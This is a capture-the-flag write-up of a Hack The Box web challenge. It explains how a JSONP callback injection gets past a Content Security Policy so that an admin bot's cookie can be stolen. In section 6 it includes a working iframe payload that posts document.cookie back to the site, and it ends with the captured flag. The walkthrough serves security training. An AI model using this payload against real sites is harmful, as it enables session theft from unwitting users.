<h1 style="color:blue;">Alien Complaint Form Challenge</h1>

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Web (Medium)

<img width="1602" height="183" alt="image" src="https://github.com/user-attachments/assets/95030ed6-e180-4df2-8391-33c9970ce78f" />


## Challenge Description

The Aliens found a cool new security feature called CSP and have since implemented it into their HR Complaint Form. 

There are reports that any issues reported by humans are not taken into account and instead deleted. 

The Human resistance has left a backdoor in the website that can be used to acquire sensitive information from the Aliens. Can you find it?


## Tools Used

- Burp Suite
- Browser Developer Tools
- VS code

# Steps

## 1. Exploring the application

First, I opened the challenge website and downloaded the provided source code and started reviewing it.

While reading the code, I found that the application consisted of several interesting components:

- A complaint submission endpoint.
- A page that lists submitted complaints.
- A JSONP endpoint.
- An administrator bot.

From the source code:

```javascript
async function purgeHumanEntries(db){
    const browser = await puppeteer.launch(browser_options);
    const page = await browser.newPage();

    await page.goto('http://127.0.0.1:1337/');
    await page.setCookie(...cookies);

    await page.goto('http://127.0.0.1:1337/list', {
        waitUntil: 'networkidle2'
    });

    await browser.close();
    await db.migrate();
};
```

<img width="1920" height="823" alt="image" src="https://github.com/user-attachments/assets/54e936e0-65d1-46df-997a-bef43c836b46" />


This tells us that every time the bot runs, it:

1. Opens the homepage.
2. Sets a cookie containing the flag.
3. Visits `/list`.
4. Deletes all submitted complaints.

So if we can execute JavaScript while the bot is viewing /list, we can steal the flag before the complaints are removed.


## 2. Understanding the available endpoints

While reviewing the routes, I found the following endpoints:

```
/api/submit
/api/jsonp
/list
```

The complaint form sends requests to:

```
POST /api/submit
```

which stores our complaint.

I also found another endpoint:

```
GET /api/jsonp
```

Its implementation is similar to this:

```javascript
/api/jsonp?callback=
```

If the callback parameter is missing, it defaults to "display"

The important observation was that the callback parameter is reflected directly into the response without validation.

This immediately suggested a possible JavaScript injection.


## 3. Investigating the JSONP endpoint

The /list page loads data using JavaScript:

- It calls /api/jsonp and uses a callback parameter from user input (in <script src="callback value">)
- If no callback is provided, it defaults to display

The vulnerable logic:
```
const jsonp = (url, callback) => {
    const s = document.createElement('script');

    if (callback) {
        s.src = `${url}?callback=${callback}`;
    } else {
        s.src = url;
    }

    document.body.appendChild(s);
};
```

<img width="1920" height="869" alt="image" src="https://github.com/user-attachments/assets/ecbc6729-2430-45ff-94d3-6c5d7c254d0d" />

#

<img width="1566" height="856" alt="image" src="https://github.com/user-attachments/assets/e745020a-80ab-4d5a-9736-b51afc6082c3" />


## 4. Bypassing the localhost restriction

Trying to visit /list --> directly did not work.

The application only allows requests originating from:

```
127.0.0.1
```

Fortunately, the administrator bot itself visits /list from localhost.

So instead of attacking the page ourselves, we need to make the bot execute our payload.

## 5. Understanding the CSP

The application uses the following Content Security Policy:

```text
default-src 'self';
object-src 'none';
base-uri 'none';
style-src 'self' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com;
```

<img width="1243" height="786" alt="image" src="https://github.com/user-attachments/assets/7f99d6d0-9a2d-407e-8678-b166c258e6a5" />

At first glance, CSP seems to block classic XSS.

For example:

```
<script>alert(1)</script>
```

will not execute because only scripts from the same origin are allowed.

However, after inspecting the complaint rendering logic, I noticed something interesting.

The complaint submitting permits using <iframe>
This gives us a way to force the administrator bot to load another page on the same origin.

## 6. Building the exploit

The idea is simple:

1. Submit a complaint containing an iframe.
2. The iframe loads /list.
3. The callback parameter injects JavaScript.
4. The injected JavaScript sends the administrator's cookies back to `/api/submit`.
5. Since /api/submit stores complaints, the stolen cookie appears as a new complaint before the cleanup occurs.

The payload becomes:

```
<iframe src="/list?callback=fetch('/api/submit',{
method:'POST',
headers:{
'Content-Type':'application/json'
},
body:JSON.stringify({
complaint:document.cookie
})
})//">
</iframe>
```

Why JSON.stringify()?

The /api/submit endpoint expects JSON data.

Instead of manually constructing a JSON string, JSON.stringify() converts a JavaScript object into valid JSON automatically.


## 7. Triggering the administrator bot

After submitting the malicious complaint, I simply waited for the administrator bot to execute.

Immediately afterward, the bot deleted all complaints since "await db.migrate();"

I prepared /api/jsonp request in burp to catch the flag before the bot delete it.

<img width="1267" height="765" alt="image" src="https://github.com/user-attachments/assets/24e324cf-9568-434f-8115-f6c169d842ef" />

## The Flag

```
HTB{CSP_4nd_js0np_d0nt_4lw4ys_G3t_4l0ng}
```

#

[The challenge link](https://app.hackthebox.com/challenges/Alien%2520Complaint%2520Form?tab=play_challenge)

See you in the next writeup!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
